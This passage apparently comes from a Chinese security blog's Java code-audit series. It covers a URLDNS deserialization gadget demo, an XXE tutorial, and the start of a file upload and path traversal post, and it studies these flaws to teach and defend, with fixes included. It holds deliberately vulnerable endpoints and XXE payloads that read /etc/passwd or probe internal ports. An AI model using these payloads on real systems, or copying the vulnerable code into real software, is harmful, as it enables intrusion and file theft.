class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//使用内部方法</span></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// put 一个值的时候就不会去查询 DNS，避免和刚刚混淆</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">        hashMap.put(url, <span class="string">"zeo"</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">      <span class="comment">//序列化成对象，输出出来</span></span><br><span class="line">        ObjectOutputStream objos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">        objos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后，开始反序列化，触发漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">//读取目标</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">      <span class="comment">//反序列化</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h2><p>先运行第一个，生产序列化数据</p><p>再运行第二个，反序列化触发漏洞</p><p>最后收到dnslog</p><p>注意：每次换DNSLOG的时候，都有重新生产序列化数据</p><h1 id="0x06-代码分析"><a href="#0x06-代码分析" class="headerlink" title="0x06 代码分析"></a>0x06 代码分析</h1><p>先看一下利用连，熟悉一下路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashMap-&gt;readObject() 反序列化点触发</span><br><span class="line">HashMap-&gt;hash()</span><br><span class="line">URL-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;getHostAddress() 发出解析请求</span><br></pre></td></tr></table></figure><p>梦开始的地方是HashMap 类</p><p>我们前⾯说了，触发反序列化的⽅法是 readObject</p><p>找到HashMap 类的 readObject ⽅法</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTgxNDM4MTEucG5n?x-oss-process=image/format,png" alt="image-20200818143811433"></p><p>触发点在 1413行的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>然后就是，其中的第一个参数 hash(key) 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">int</span> h;</span><br><span class="line">   <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是换对象了，这里的key肯定不是null，那么就会触发 key.hashCode()</p><p>这里使⽤的这个key是⼀个 java.net.URL 对象，我们看看其 hashCode ⽅法。</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-b3LQziqw-1597834189373)(/Users/zy/Library/Application Support/typora-user-images/image-20200813212359358.png)]</p><p>URL对象再次跟入 继续跟进其 hashCode ⽅法</p><p>359行 getHostAddress 方法传入了 DNSLOG地址</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTMyMTI1MTIucG5n?x-oss-process=image/format,png" alt="image-20200813212512006"></p><p>再跟入，其实就是442行，直接一句发出请求了</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTgxNDQ4NTEucG5n?x-oss-process=image/format,png" alt="image-20200818144851112"></p><p>现在运行前</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTMyMTI2MjkucG5n?x-oss-process=image/format,png" alt="image-20200813212629442"></p><p>这剧请求了URL，发出了请求</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTMyMTI3MDYucG5n?x-oss-process=image/format,png" alt="image-20200813212706551"></p><p>收到DNS请求，成功触发URLDNS整个功能</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTgxMzUzMDUucG5n?x-oss-process=image/format,png" alt="image-20200818135305115"></p><h1 id="0x07-坑点："><a href="#0x07-坑点：" class="headerlink" title="0x07 坑点："></a>0x07 坑点：</h1><p>新手第一次调试，总找不到触发点，还以为不在这，尤其是这个地方</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTgxNDU1MzQucG5n?x-oss-process=image/format,png" alt="image-20200818145534883"></p><p>这里有好几个对象, 要循环好几次，所以要找到 URL对象，再步入参数的hash函数</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTgxNDU4NTEucG5n?x-oss-process=image/format,png" alt="image-20200818145851784"></p><h1 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h1><p><a href="https://xz.aliyun.com/t/7157#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/7157#toc-0</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计：XXE漏洞</title>
      <link href="/2020/08/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AXXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AXXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>Java 代码审计自学：主要自己一个人学习，有点闭门造车，搜索引擎学习法，但是还是记录一下，也分享一下，也便于将来的总结和反思，如果我能终能学到什么，我也会重新梳理思路，为那些自学者提供一个好的思路，所以有了下面的系列文章java代码审计自学篇。</p><h1 id="0x01-XXE漏洞简介"><a href="#0x01-XXE漏洞简介" class="headerlink" title="0x01 XXE漏洞简介"></a>0x01 XXE漏洞简介</h1><p>XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。Java中的XXE支持sun.net.<a href="http://www.protocol" target="_blank" rel="noopener">www.protocol</a> 里的所有协议：http，https，file，ftp，mailto，jar，netdoc。一般利用file协议读取文件，利用http协议探测内网，没有回显时可组合利用file协议和ftp协议来读取文件。</p><h1 id="0x02-XXE相关基础概念"><a href="#0x02-XXE相关基础概念" class="headerlink" title="0x02 XXE相关基础概念"></a>0x02 XXE相关基础概念</h1><h2 id="XML-amp-DTD"><a href="#XML-amp-DTD" class="headerlink" title="XML&amp;DTD"></a>XML&amp;DTD</h2><p>XML （可扩展标记语言，EXtensible Markup Language），是一种标记语言，用来传输和存储数据，而非显示数据。<br>DTD（文档类型定义，Document Type Definition）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p><h2 id="实体ENTITY"><a href="#实体ENTITY" class="headerlink" title="实体ENTITY"></a>实体ENTITY</h2><p>XML中的实体类型，一般有下面几种：字符实体、命名实体（或内部实体）、外部普通实体、外部参数实体。除外部参数实体外，其它实体都以字符（&amp;）开始，以字符（;）结束。</p><h1 id="0x03-XXE审计函数"><a href="#0x03-XXE审计函数" class="headerlink" title="0x03 XXE审计函数"></a>0x03 XXE审计函数</h1><p>XML解析一般在导入配置、数据传输接口等场景可能会用到，涉及到XML文件处理的场景可查看XML解析器是否禁用外部实体，从而判断是否存在XXE。部分XML解析接口如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure><h1 id="0x04-漏洞代码例子"><a href="#0x04-漏洞代码例子" class="headerlink" title="0x04 漏洞代码例子"></a>0x04 漏洞代码例子</h1><p>使用spring boot框架写的小例子</p><p>询问一个常用的解析方法，选择一个有回显的方法，方便学习</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">@RequestMapping</span>(value = <span class="string">"/DocumentBuilder"</span>, method = RequestMethod.POST)</span><br><span class="line"><span class="comment">//直接POST XML数据报过来就行</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">//获取boy</span></span><br><span class="line">          String body = WebUtils.getRequestBody(request);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化DocumentBuilderFactory对象</span></span><br><span class="line">          DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">          DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//树立body里面xml转换流</span></span><br><span class="line">          StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">          InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//解析XML的对象，转化为Document对象</span></span><br><span class="line">          Document document = db.parse(is); </span><br><span class="line">        </span><br><span class="line">          <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">          StringBuilder buf = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">          NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">              Node rootNode = rootNodeList.item(i);</span><br><span class="line">              NodeList child = rootNode.getChildNodes();</span><br><span class="line">              <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                  Node node = child.item(j);</span><br><span class="line">                  buf.append(String.format(<span class="string">"%s: %s\n"</span>, node.getNodeName(), node.getTextContent()));</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          sr.close();</span><br><span class="line">        <span class="comment">//返回string 有回显</span></span><br><span class="line">          <span class="keyword">return</span> buf.toString();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          logger.error(e.toString());</span><br><span class="line">          <span class="keyword">return</span> EXCEPT;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h1 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h1><h2 id="http-协议探测"><a href="#http-协议探测" class="headerlink" title="http 协议探测"></a>http 协议探测</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">joychou</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://127.0.0.1:8888"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过回显和延迟，粗略判断，或者DNS无回显探测</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTkxODAwNTIucG5n?x-oss-process=image/format,png" alt="image-20200819180052434"></p><h2 id="FILE-协议-任意文件读取"><a href="#FILE-协议-任意文件读取" class="headerlink" title="FILE 协议 任意文件读取"></a>FILE 协议 任意文件读取</h2><p>poc：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">joychou</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功读取 etc/passwd</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTkxODA0MjIucG5n?x-oss-process=image/format,png" alt="image-20200819180422865"></p><p>还有一些ooxml 这种后续再写其他的研究一下</p><h1 id="0x06-修复"><a href="#0x06-修复" class="headerlink" title="0x06 修复"></a>0x06 修复</h1><p>主要是这三句话，加入了禁止使用实体类</p><p>很多封装的方法，都是这样的去解决，都是禁用了ENTITY实体。</p><p>下面是DocumentBuilder禁用方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/Sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            db.parse(is);  </span><br><span class="line">            sr.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"DocumentBuilder security code"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计：文件篇/文件上传/文件读取/目录遍历</title>
      <link href="/2020/08/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E6%96%87%E4%BB%B6%E7%AF%87!%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0!%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96!%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
      <url>/2020/08/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E6%96%87%E4%BB%B6%E7%AF%87!%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0!%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96!%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>自学Java 代码审计，主要自己一个人学习，有点闭门造车，搜索引擎学习法，但是还是记录一下，也分享一下，也便于将来的总结和反思，如果我能终能学到什么，我也会重新梳理思路，为那些自学者提供一个好的思路，所以有了下面的系列文章java代码审计自学篇。</p><h1 id="0x01-文件路径穿越"><a href="#0x01-文件路径穿越" class="headerlink" title="0x01 文件路径穿越"></a>0x01 文件路径穿越</h1><h2 id="简述："><a href="#简述：" class="headerlink" title="简述："></a><strong>简述：</strong></h2><ul><li>许多的文件漏洞都是来源于文件路径的问题，好多时候也是路径可控，再加上一下程序员奇怪的逻辑。</li><li>如果漏洞路径可控提供很多其他突破的方法</li><li>攻击者利用<code>../</code>可以上传至任意指定目录或者目录穿越。</li></ul><h2 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a><strong>示例代码：</strong></h2><p>中间有<code>../</code>可以造成文件路径的不安全</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package file;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class filepath &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        File file &#x3D; new File(&quot;..&#x2F;..&#x2F;file&#x2F;123.txt&quot;);</span><br><span class="line">        System.out.println(file.getAbsolutePath());</span><br><span class="line">        System.out.println(file.getCanonicalPath());</span><br><span class="line">        System.out.println(file.exists());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MDkxNjMzNDAucG5n?x-oss-process=image/format,png" alt="image-20200809163340930"></p><h2 id="潜在的目录穿越："><a href="#潜在的目录穿越：" class="headerlink" title="潜在的目录穿越："></a>潜在的目录穿越：</h2><p>一个文件被打开，然后读取文件内容，这个文件名来自于一个输入的参数。如果没有过滤这个传入的参数，那么本地文件系统中任意文件都会被读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件读取有问题，别在里面拼接</span><br><span class="line">val result &#x3D; Source.fromFile(&quot;public&#x2F;&quot; + value).getLines().mkString &#x2F;&#x2F; Weak point</span><br><span class="line"></span><br><span class="line">修复：要在外面拼接好</span><br><span class="line">filename &#x3D; &quot;public&#x2F;&quot; + FilenameUtils.getName(value)</span><br><span class="line">val result &#x3D; Source.fromFile(filename).getLines().mkString</span><br></pre></td></tr></table></figure><h1 id="0x02文件上传"><a href="#0x02文件上传" class="headerlink" title="0x02文件上传"></a>0x02文件上传</h1><h2 id="简述：-1"><a href="#简述：-1" class="headerlink" title="简述："></a>简述：</h2><p>文件上传过程中，因为未校验上传文件后缀类型，导致用户可上传jsp和jspx等一些webshell文件。</p><p>代码审计时可重点关注对上传文件类型是否有足够安全的校验。</p><h2 id="漏洞示例："><a href="#漏洞示例：" class="headerlink" title="漏洞示例："></a>漏洞示例：</h2><p>没有任何过滤</p><p>jdk原始的流操作上传</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">FileUpload</span><span class="params">(MultipartFile file)</span></span>&#123;</span><br><span class="line">        String fileName = file.getOriginalFilename();</span><br><span class="line">        <span class="keyword">if</span> (fileName==<span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"file is error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="comment">//目录拼接</span></span><br><span class="line">        String filePath = <span class="string">"/static/images/uploads/"</span>+fileName;</span><br><span class="line">        <span class="keyword">if</span> (!file.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              <span class="comment">//转化字节流</span></span><br><span class="line">                <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">              <span class="comment">//创建file对象 转化为BufferedOutputStream对象</span></span><br><span class="line">                BufferedOutputStream stream =</span><br><span class="line">                        <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(filePath)));</span><br><span class="line">                <span class="comment">//写入流  </span></span><br><span class="line">                stream.write(bytes);</span><br><span class="line">                <span class="comment">//关闭流</span></span><br><span class="line">                stream.close();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"OK"</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">return</span> e.getMessage();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"You failed to upload "</span> + file.getOriginalFilename() + <span class="string">" because the file was empty."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>框架常用的封装类上传</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String UPLOADED_FOLDER = <span class="string">"/tmp/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">FileUpload</span><span class="params">(@RequestParam(<span class="string">"file"</span>)</span> MultipartFile file,RedirectAttributes redirectAttributes) </span>&#123;</span><br><span class="line">        <span class="comment">//检测文件是否存</span></span><br><span class="line">        <span class="keyword">if</span> (file.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 赋值给uploadStatus.html里的动态参数message</span></span><br><span class="line">            redirectAttributes.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"Please select a file to upload"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/file/status"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取文件，上传</span></span><br><span class="line">          <span class="comment">// 获取字节流，放入数字</span></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">             <span class="comment">//获取文件路径，目录拼接  /TMP/ + Filename</span></span><br><span class="line">            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">           <span class="comment">//文件写入</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">           <span class="comment">//回显路径</span></span><br><span class="line">            